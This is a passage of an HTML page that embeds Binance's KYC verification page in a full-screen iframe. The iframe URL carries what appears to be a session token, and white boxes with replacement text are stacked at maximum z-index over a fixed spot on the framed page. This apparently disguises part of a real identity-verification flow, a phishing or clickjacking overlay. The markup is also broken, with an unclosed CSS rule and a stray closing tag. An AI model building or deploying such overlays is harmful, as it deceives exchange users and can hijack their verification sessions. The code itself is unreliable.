        .page {
            position: relative;

        }

        iframe {
            position: absolute;
            inset: 0;

            height: 100%;

        .black-box {
            position: absolute;
            top: 200px;
            left: 830px;
            width: 170px;
            height: 40px;
            background: #fff;
            z-index: 999999;
        }

        .my-text {
            position: absolute;
            top: 200px;
            left: 830px;
            z-index: 999999;
            font-size: 20px;
            font-family: Arial, sans-serif;
            color: black;
            background: white;
            padding: 5px 10px;
        }
    </style>
</head>

<body>

    <div class="page">

        <iframe src="https://www.binance.com/en/kyc-center?sl_token=27955b0844f18142d74eaa542f2f4887a1be90755f74058831207aebcfa69f75&theme=dark&flowVariant=GLOBAL"></iframe>

        <!-- Separate text -->

            HOGA GOGA
        </div>

    </div>

</body>
</html>
